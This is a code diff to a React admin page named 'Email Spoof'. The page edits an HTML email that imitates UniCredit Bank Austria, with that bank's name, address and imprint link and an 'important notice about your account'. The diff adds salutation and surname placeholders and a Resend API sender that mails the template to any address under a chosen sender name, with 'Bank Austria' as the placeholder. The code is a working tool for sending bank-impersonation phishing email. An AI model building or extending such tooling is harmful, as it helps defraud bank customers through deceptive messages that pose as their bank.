@@ -1,10 +1,28 @@
 import { useEffect, useState } from "react";
-import { Copy, Check, Code, Eye, RotateCcw } from "lucide-react";
+import { Copy, Check, Code, Eye, RotateCcw, Send, Settings, Mail } from "lucide-react";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+  DialogFooter,
+} from "@/components/ui/dialog";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 import AdminLayout from "@/components/AdminLayout";
 import { useToast } from "@/hooks/use-toast";
 
-const STORAGE_KEY = "admin_email_spoof_html_v3";
+const STORAGE_KEY = "admin_email_spoof_html_v4";
+const RESEND_KEY = "admin_email_spoof_resend_v1";
 
 const defaultHtmlTemplate = `<!DOCTYPE html>
 <html lang="de">
@@ -39,13 +57,13 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
 
           <!-- Body -->
           <tr>
-            <td style="padding:35px 40px 20px 40px;">
+            <td style="padding:35px 40px 30px 40px;">
               <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
                 Wichtige Mitteilung zu Ihrem Konto
               </h1>
 
               <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
-                Sehr geehrte Kundin, sehr geehrter Kunde,
+                {{ANREDE}} {{NACHNAME}},
               </p>
 
               <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
@@ -70,23 +88,8 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
                 </tr>
               </table>
 
-              <p style="margin:0 0 28px 0;font-size:15px;line-height:1.6;color:#333333;">
+              <p style="margin:0 0 8px 0;font-size:15px;line-height:1.6;color:#333333;">
                 Ihr Guthaben auf dem Sparkonto ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt &mdash; es besteht keinerlei Anlass zur Sorge um Ihr Verm&ouml;gen. S&auml;mtliche Sicherungsmechanismen Ihrer Bank Austria greifen wie vorgesehen.
-              </p>
-
-              <!-- CTA Button -->
-              <table role="presentation" cellpadding="0" cellspacing="0" style="margin:0 auto 30px auto;">
-                <tr>
-                  <td align="center" style="background-color:#E2001A;border-radius:6px;">
-                    <a href="https://www.bankaustria.at" target="_blank" style="display:inline-block;padding:14px 36px;font-size:15px;font-weight:600;color:#ffffff;text-decoration:none;letter-spacing:0.3px;">
-                      Jetzt Legitimierung abschlie&szlig;en
-                    </a>
-                  </td>
-                </tr>
-              </table>
-
-              <p style="margin:0 0 8px 0;font-size:13px;line-height:1.5;color:#888888;">
-                Bei R&uuml;ckfragen wenden Sie sich bitte direkt an Ihren zugeteilten Berater oder an unser Service-Team.
               </p>
             </td>
           </tr>
@@ -101,7 +104,7 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
                       UniCredit Bank Austria AG
                     </p>
                     <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
-                      Rothschildplatz 1, 1020 Wien | Tel: +43 (0)5 05 05-25
+                      Rothschildplatz 1, 1020 Wien
                     </p>
                     <p style="margin:0;font-size:11px;color:#bbbbbb;">
                       <a href="https://www.bankaustria.at/impressum.jsp" style="color:#999999;text-decoration:underline;">Impressum</a>
@@ -123,6 +126,13 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
 </body>
 </html>`;
 
+type ResendConfig = { apiKey: string; fromName: string; fromEmail: string };
+
+const renderTemplate = (html: string, anrede: "Herr" | "Frau", nachname: string) => {
+  const anredeFull = anrede === "Herr" ? "Sehr geehrter Herr" : "Sehr geehrte Frau";
+  return html.split("{{ANREDE}}").join(anredeFull).split("{{NACHNAME}}").join(nachname || "");
+};
+
 const AdminEmailSpoof = () => {
   const [htmlCode, setHtmlCode] = useState(() => {
     if (typeof window === "undefined") return defaultHtmlTemplate;
@@ -130,6 +140,25 @@ const AdminEmailSpoof = () => {
   });
   const [showCode, setShowCode] = useState(false);
   const [copied, setCopied] = useState(false);
+
+  const [resend, setResend] = useState<ResendConfig>(() => {
+    if (typeof window === "undefined") return { apiKey: "", fromName: "", fromEmail: "" };
+    try {
+      const raw = localStorage.getItem(RESEND_KEY);
+      return raw ? JSON.parse(raw) : { apiKey: "", fromName: "", fromEmail: "" };
+    } catch {
+      return { apiKey: "", fromName: "", fromEmail: "" };
+    }
+  });
+
+  const [sendOpen, setSendOpen] = useState(false);
+  const [step, setStep] = useState<"form" | "preview">("form");
+  const [to, setTo] = useState("");
+  const [anrede, setAnrede] = useState<"Herr" | "Frau">("Herr");
+  const [nachname, setNachname] = useState("");
+  const [subject, setSubject] = useState("Wichtige Mitteilung zu Ihrem Konto");
+  const [sending, setSending] = useState(false);
+
   const { toast } = useToast();
 
   useEffect(() => {
@@ -145,7 +174,62 @@ const AdminEmailSpoof = () => {
 
   const handleReset = () => {
     setHtmlCode(defaultHtmlTemplate);
-    toast({ title: "Auf Original zur&uuml;ckgesetzt" });
+    toast({ title: "Auf Original zurückgesetzt" });
+  };
+
+  const saveResend = () => {
+    localStorage.setItem(RESEND_KEY, JSON.stringify(resend));
+    toast({ title: "Resend-Konfiguration gespeichert" });
+  };
+
+  const previewHtml = renderTemplate(htmlCode, anrede, nachname || "Mustermann");
+
+  const openSendDialog = () => {
+    setStep("form");
+    setSendOpen(true);
+  };
+
+  const goToPreview = () => {
+    if (!to || !nachname) {
+      toast({ title: "Bitte Empfänger-Email und Nachname angeben", variant: "destructive" });
+      return;
+    }
+    setStep("preview");
+  };
+
+  const sendEmail = async () => {
+    if (!resend.apiKey || !resend.fromEmail || !resend.fromName) {
+      toast({ title: "Resend-Konfiguration unvollständig", variant: "destructive" });
+      return;
+    }
+    setSending(true);
+    try {
+      const res = await fetch("https://api.resend.com/emails", {
+        method: "POST",
+        headers: {
+          Authorization: `Bearer ${resend.apiKey}`,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          from: `${resend.fromName} <${resend.fromEmail}>`,
+          to: [to],
+          subject,
+          html: renderTemplate(htmlCode, anrede, nachname),
+        }),
+      });
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) {
+        throw new Error(data?.message || `HTTP ${res.status}`);
+      }
+      toast({ title: "Email versendet!" });
+      setSendOpen(false);
+      setTo("");
+      setNachname("");
+    } catch (e: any) {
+      toast({ title: "Versand fehlgeschlagen", description: e.message, variant: "destructive" });
+    } finally {
+      setSending(false);
+    }
   };
 
   return (
@@ -155,7 +239,7 @@ const AdminEmailSpoof = () => {
         <div className="flex items-start justify-between gap-4">
           <div>
             <h1 className="text-2xl font-bold tracking-tight text-slate-900">Email Spoof</h1>
-            <p className="mt-1 text-sm text-slate-500">Bank Austria Email-Template bearbeiten und als HTML kopieren</p>
+            <p className="mt-1 text-sm text-slate-500">Bank Austria Email-Template bearbeiten und versenden</p>
           </div>
           <Button variant="outline" size="sm" onClick={handleReset} className="gap-2 text-xs">
             <RotateCcw className="h-3.5 w-3.5" />
@@ -171,21 +255,11 @@ const AdminEmailSpoof = () => {
               Vorschau
             </div>
             <div className="flex items-center gap-2">
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={() => setShowCode(!showCode)}
-                className="gap-2 text-xs"
-              >
+              <Button variant="outline" size="sm" onClick={() => setShowCode(!showCode)} className="gap-2 text-xs">
                 <Code className="h-3.5 w-3.5" />
                 {showCode ? "Code ausblenden" : "HTML-Code anzeigen"}
               </Button>
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={handleCopy}
-                className="gap-2 text-xs"
-              >
+              <Button variant="outline" size="sm" onClick={handleCopy} className="gap-2 text-xs">
                 {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                 {copied ? "Kopiert!" : "Kopieren"}
               </Button>
@@ -194,7 +268,7 @@ const AdminEmailSpoof = () => {
           <div className="bg-slate-50 p-6">
             <div className="mx-auto max-w-[640px] overflow-hidden rounded-lg border border-slate-200 bg-white shadow-sm">
               <iframe
-                srcDoc={htmlCode}
+                srcDoc={previewHtml}
                 className="w-full border-none"
                 style={{ height: "780px" }}
                 title="Email Preview"
@@ -207,11 +281,9 @@ const AdminEmailSpoof = () => {
         {/* Code Editor */}
         {showCode && (
           <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
-            <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
-              <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
-                <Code className="h-4 w-4" />
-                HTML-Code (Live-Bearbeitung)
-              </div>
+            <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
+              <Code className="h-4 w-4" />
+              HTML-Code (Live-Bearbeitung) — Platzhalter: <code className="text-xs">{`{{ANREDE}}`}</code>, <code className="text-xs">{`{{NACHNAME}}`}</code>
             </div>
             <textarea
               value={htmlCode}
@@ -222,7 +294,162 @@ const AdminEmailSpoof = () => {
             />
           </div>
         )}
+
+        {/* Resend Config */}
+        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
+          <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
+            <Settings className="h-4 w-4" />
+            Resend-Konfiguration
+          </div>
+          <div className="space-y-4 p-5">
+            <p className="text-xs text-slate-500">
+              Der API-Key wird ausschließlich lokal in Ihrem Browser gespeichert (localStorage) und direkt an die Resend-API gesendet.
+            </p>
+            <div className="grid gap-4 sm:grid-cols-2">
+              <div className="sm:col-span-2">
+                <Label htmlFor="apiKey">Resend API Key</Label>
+                <Input
+                  id="apiKey"
+                  type="password"
+                  placeholder="re_..."
+                  value={resend.apiKey}
+                  onChange={(e) => setResend({ ...resend, apiKey: e.target.value })}
+                  className="mt-1.5"
+                />
+              </div>
+              <div>
+                <Label htmlFor="fromName">Absendername</Label>
+                <Input
+                  id="fromName"
+                  placeholder="Bank Austria"
+                  value={resend.fromName}
+                  onChange={(e) => setResend({ ...resend, fromName: e.target.value })}
+                  className="mt-1.5"
+                />
+              </div>
+              <div>
+                <Label htmlFor="fromEmail">Absender-Email</Label>
+                <Input
+                  id="fromEmail"
+                  type="email"
+                  placeholder="noreply@deinedomain.at"
+                  value={resend.fromEmail}
+                  onChange={(e) => setResend({ ...resend, fromEmail: e.target.value })}
+                  className="mt-1.5"
+                />
+              </div>
+            </div>
+            <Button onClick={saveResend} size="sm">Speichern</Button>
+          </div>
+        </div>
+
+        {/* Send Card */}
+        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
+          <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
+            <Mail className="h-4 w-4" />
+            Email versenden
+          </div>
+          <div className="flex items-center justify-between gap-4 p-5">
+            <p className="text-sm text-slate-600">
+              Sendet das aktuelle Template über Resend an einen Empfänger.
+            </p>
+            <Button onClick={openSendDialog} className="gap-2">
+              <Send className="h-4 w-4" />
+              Email versenden
+            </Button>
+          </div>
+        </div>
       </div>
+
+      {/* Send Dialog */}
+      <Dialog open={sendOpen} onOpenChange={setSendOpen}>
+        <DialogContent className="max-w-3xl">
+          <DialogHeader>
+            <DialogTitle>{step === "form" ? "Email vorbereiten" : "Vorschau"}</DialogTitle>
+            <DialogDescription>
+              {step === "form"
+                ? "Empfänger und Anrede angeben."
+                : "Prüfe die Email vor dem Versand."}
+            </DialogDescription>
+          </DialogHeader>
+
+          {step === "form" ? (
+            <div className="space-y-4">
+              <div>
+                <Label htmlFor="to">Empfänger-Email</Label>
+                <Input
+                  id="to"
+                  type="email"
+                  value={to}
+                  onChange={(e) => setTo(e.target.value)}
+                  placeholder="kunde@example.at"
+                  className="mt-1.5"
+                />
+              </div>
+              <div className="grid gap-4 sm:grid-cols-2">
+                <div>
+                  <Label>Anrede</Label>
+                  <Select value={anrede} onValueChange={(v) => setAnrede(v as "Herr" | "Frau")}>
+                    <SelectTrigger className="mt-1.5">
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="Herr">Herr</SelectItem>
+                      <SelectItem value="Frau">Frau</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+                <div>
+                  <Label htmlFor="nachname">Nachname</Label>
+                  <Input
+                    id="nachname"
+                    value={nachname}
+                    onChange={(e) => setNachname(e.target.value)}
+                    placeholder="Mustermann"
+                    className="mt-1.5"
+                  />
+                </div>
+              </div>
+              <div>
+                <Label htmlFor="subject">Betreff</Label>
+                <Input
+                  id="subject"
+                  value={subject}
+                  onChange={(e) => setSubject(e.target.value)}
+                  className="mt-1.5"
+                />
+              </div>
+            </div>
+          ) : (
+            <div className="overflow-hidden rounded-lg border border-slate-200">
+              <iframe
+                srcDoc={renderTemplate(htmlCode, anrede, nachname)}
+                className="w-full border-none bg-white"
+                style={{ height: "560px" }}
+                title="Send Preview"
+                sandbox=""
+              />
+            </div>
+          )}
+
+          <DialogFooter>
+            {step === "form" ? (
+              <>
+                <Button variant="outline" onClick={() => setSendOpen(false)}>Abbrechen</Button>
+                <Button onClick={goToPreview}>Vorschau anzeigen</Button>
+              </>
+            ) : (
+              <>
+                <Button variant="outline" onClick={() => setStep("form")}>Zurück</Button>
+                <Button onClick={sendEmail} disabled={sending} className="gap-2">
+                  <Send className="h-4 w-4" />
+                  {sending ? "Sende..." : "Jetzt senden"}
+                </Button>
+              </>
+            )}
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </AdminLayout>
   );
 };
